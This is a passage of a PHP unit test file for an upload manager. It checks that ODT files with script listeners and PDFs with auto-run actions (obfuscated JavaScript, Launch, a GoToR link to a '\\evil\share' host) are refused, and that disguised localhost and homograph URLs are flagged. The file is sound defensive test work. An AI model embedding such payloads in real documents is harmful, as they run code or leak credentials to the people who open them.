                $content('<script:event-listener script:event-name="dom:load" xlink:href="vnd.sun.star.script:x"/>'),
                ['Object 1/content.xml' => '<x/>'],
            ] as $more
        ) {
            $this->assert_refused(
                fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->odt($more)), 'a'),
                'errorpiecemacro'
            );
        }

        // A hyperlink and a picture inside the file are not refused.
        $row = $manager->add_file(
            $this->evidenceid,
            'other',
            '',
            $this->file($this->odt($content(
                '<text:a xlink:href="http://exemple.test/">x</text:a><draw:image xlink:href="Pictures/a.png"/>'
            ))),
            'a'
        );
        $this->assertSame('odt', $row->ext);
    }

    public function test_a_pdf_with_an_action_that_starts_on_opening_is_refused_however_it_is_written(): void {
        $manager = new piece_manager();

        $actions = [
            '/Java#53cript (x)', "/JS\n(x)", '/JS<</S/x>>', '/GoToR /F (\\\\evil\\share)',
            '/SubmitForm', '/Launch', '/RichMedia',
        ];
        foreach ($actions as $action) {
            $this->assert_refused(
                fn() => $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf($action)), 'a.pdf'),
                'errorpiecemacro'
            );
        }

        // A link to an address and an open action to a page are ordinary.
        $ordinary = $this->pdf('/OpenAction [3 0 R /Fit] /URI (http://exemple.test/)');
        $this->assertSame('pdf', $manager->add_file($this->evidenceid, 'other', '', $this->file($ordinary), 'a.pdf')->ext);
    }

    public function test_an_address_that_a_browser_reads_as_a_local_one_is_warned_about(): void {
        $manager = new piece_manager();

        foreach (['http://127.1/', 'http://0x7f.0.0.1/', 'http://localhost./', 'http://2130706433/', 'http://[::1]/'] as $url) {
            $this->assertSame(['piecewarnprivate'], $manager->add_link($this->evidenceid, 'other', '', $url)->warnings, $url);
            $this->setUser($this->candidate);
            $GLOBALS['DB']->delete_records('tool_vae_piece');
        }
        $this->assertSame('xn--pple-43d.com', piece_manager::display_host("https://\u{0430}pple.com/"));
        $this->assertSame('exemple.test', piece_manager::display_host('https://exemple.test/a'));
    }

    public function test_a_piece_cannot_be_removed_through_another_declaration(): void {
        global $DB;
        $manager = new piece_manager();
        $row = $manager->add_link($this->evidenceid, 'other', 'Un titre', 'https://exemple.test/x');

        $this->assert_refused(fn() => $manager->remove((int) $row->id, $this->evidenceid + 1), 'errorpiecedenied');
        $this->assertNull($DB->get_field('tool_vae_piece', 'timeremoved', ['id' => $row->id]), 'Nothing was removed.');

        $this->assertNotNull($manager->remove((int) $row->id, $this->evidenceid)->timeremoved);
    }

    public function test_the_sweep_takes_pieces_without_declaration_and_files_without_piece(): void {
        global $DB;
        $manager = new piece_manager();
        $row = $manager->add_file($this->evidenceid, 'other', '', $this->file($this->pdf()), 'a.pdf');
        $context = \context_user::instance($this->candidate->id);
        $fs = get_file_storage();

        // The declaration goes without the purge having finished.
        $DB->delete_records('tool_vae_evidence', ['id' => $this->evidenceid]);
        // A file nobody points at.
        $fs->create_file_from_string([
            'contextid' => $context->id, 'component' => 'tool_vae', 'filearea' => 'piece', 'itemid' => 987654,
            'filepath' => '/', 'filename' => 'x.pdf',
        ], $this->pdf());

        $this->assertGreaterThanOrEqual(2, piece_manager::sweep_orphans());

        $this->assertSame(0, $DB->count_records('tool_vae_piece', ['id' => $row->id]));
        $this->assertCount(0, $fs->get_area_files($context->id, 'tool_vae', 'piece', false, 'id', false));
        $this->assertSame(0, piece_manager::sweep_orphans(), 'Idempotent.');
    }
}
